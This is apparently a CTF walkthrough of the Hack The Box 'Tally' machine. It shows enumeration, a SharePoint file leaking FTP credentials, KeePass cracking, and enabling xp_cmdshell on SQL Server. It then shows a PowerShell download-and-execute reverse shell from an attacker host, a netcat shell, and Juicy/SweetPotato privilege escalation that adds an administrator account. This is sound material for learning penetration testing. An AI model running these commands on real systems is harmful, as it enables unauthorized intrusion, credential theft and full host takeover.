port 445(smb)
port 5985(winrm)
port 21 (ftp)
port 80 (http)

With port 445 (smb) open, I use crackmapexec to gather information about the victim machine
``` bash
❯ crackmapexec smb 10.10.10.59
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)

```

Now I'll attempt to list the shared resources via SMB
``` bash
❯ smbmap -H 10.10.10.59 -u 'null'
[!] Authentication error on 10.10.10.59

```

Access is denied, so I need a valid credentials to list shared resources

Port 80 is open, so I use whatweb to gather  information about the websiite
``` bash
❯ whatweb 10.10.10.59
http://10.10.10.59 [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], RedirectLocation[http://10.10.10.59/default.aspx], Title[Document Moved], UncommonHeaders[x-sharepointhealthscore,sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET]

http://10.10.10.59/default.aspx [200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], MetaGenerator[Microsoft SharePoint], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], Script[text/javascript], Title[Home - Home][Title element contains newline(s)!], UncommonHeaders[x-sharepointhealthscore,sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET], X-UA-Compatible[IE=10]

```

I see some information related to sharepoint (_SharePoint_ is a web-based collaborative platform that integrates natively with Microsoft 365)

While exploring the website I discover the sharepoint site and attempt to find interesting routes by fuzzing. I use google for this and review sharepoint pentesting  reports to discover potential routes

``` bash
http://10.10.10.59/_layouts/15/viewlsts.aspx -> DOcuments

```

Within the website, I find an ftp-details file. After downloading it, I obtain credentials to connect via FTP
``` bash 
FTP details
ftp_user
hostname: tally

workgroup: htb.local

password: UTDRSCH53c"$6hys

Please create your own user folder upon logging in

```

After connecting to the ftp service, I access leaked information, Given the volume of data,  I use the curlftpfs tool to create a mount for easier access to all the FTP information

``` bash
curlftpfs 10.10.10.59 /mnt/ftp/ -o user=ftp_user:UTDRSCH53c"$6hys
tree -fas
cp /User/Tim/Files/tim.kdbx .
```

I obtain a .kdbx file, which is a Data file created by KePass Password Safe, and there is a way to crack it
I'll use the keepassxc tool to examine its contents, However it's protected ,so I will use john to crack it.
```
keepass2john tim.kdbx > hash
❯ john --wordlist=~/Documents/wordlist/rockyou.txt hash
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**simplementeyo    (tim)**
1g 0:00:00:11 DONE (2023-09-22 12:17) 0.08665g/s 2140p/s 2140c/s 2140C/s teamomivida..rylee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

With the help of john I obtain credentials for the user tim, so Now I can use keepassxc to see the information of the .kdbx file

I get more credentials, this time for a shared resources
``` bash
Finance:Acc0unting

```

Using these credentials, I revisit smbmap to list shared resources via SMB

``` bash
smbmap -H 10.10.10.59 -u 'Finance' -p 'Acc0unting'
[+] IP: 10.10.10.59:445	Name: unknown             	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ACCT                                              	READ ONLY	
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
```

There are some resources, but one (ACCT) have the privileged READ ONLY
I'll list the information of this resource

``` bash
smbmap -H 10.10.10.59 -u 'Finance' -p 'Acc0unting' -r ACCT
[+] IP: 10.10.10.59:445	Name: unknown             	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ACCT                                              	READ ONLY	
	.\ACCT\\*
	dr--r--r--                0 Thu Sep 21 01:27:54 2017	.
	dr--r--r--                0 Thu Sep 21 01:27:54 2017	..
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Customers
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Fees
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Invoices
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Jess
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Payroll
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Reports
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Tax
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	Transactions
	dr--r--r--                0 Thu Sep 21 01:27:49 2017	zz_Archived
	dr--r--r--                0 Thu Sep 21 01:27:54 2017	zz_Migration

```

there are a lot of directories, I opt for the same approach as before but this time I use the  "mount -t cifs" command
``` bash
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,rw
tree -fas
```

there are a backup directory, maybe some credentials are there.
``` bash
mount -t cifs //10.10.10.59/ACCT /mnt/smb -o username=Finance,password=Acc0unting,rw
tree -fas
```

Inside this directory I discover various binaries and. One binary, "tester.exe" àrticulary piques my interest.
I use the "strings" tool inspect its contents and I found more credentials, this time for a sql server
``` bash
/mnt/smbshred/zz_Migration/Binaries/New folder ╱ ✔ ❯ strings tester.exe | less                 
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
```

With the port 1433 open, I can connect to the sql server using the impacket tool with these credentials

``` bash
mssqlclient.py WORKGROUP/sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
#try xp_cmdshell "whoami" if is off you can try to configure it -> 
SQL> sp_configure "show advanced options", 1 -> reconfigure -> sp_configure "xp_cmdshell", 1 
# now I can execute commands and try to execute a reverse shell
xp_cmdshell "whoami"
```

Now that I can execute commands on the victim machine, I'm going to use Invoce-PowerShellTCP.ps1 to stablish a reverse shell

``` bash
# on the victim machine
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.5/Invoke.ps1\")"

# On my machine
python -m http.server 80
rlwrap nc -nlvp 1234

```


Having gained access to the victim machine, it's time to escalate privileges

``` bash
whoami /priv

```

The user has the "SeImpersonatePrivilege" privilege, which can be exploited with the Juicy Potato tool
``` bash
#On my machine
sudo python -m http.server 80

# On victim machine
iwr -uri http://10.10.14.5/juicypotato.exe -OutFile juicy.exe
.\juicy.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c net user kvzlx **colombia**123 /add" -> create a user
.\juicy.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c net localgroup Administrators kvzlx /add" -> put the user in the administrator group
.\juicy.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -> put the user in the Remote management users to can connect with via evil-winrm


#I have problem with Juicy potato so I use SweetPotato.exe and a nc64.exe binary (netcat)
.\SweetPotato.exe -p nc64.exe -a "-e powershell 10.10.14.5 1234"

  
```

this completes the privilege escalation, and I now have full control over the machine.
User flag > e806ef7ecb81f2a281c36f8b06f4d770
root flag > 7cac06b6c854ced20c5036f6fe13ac0b

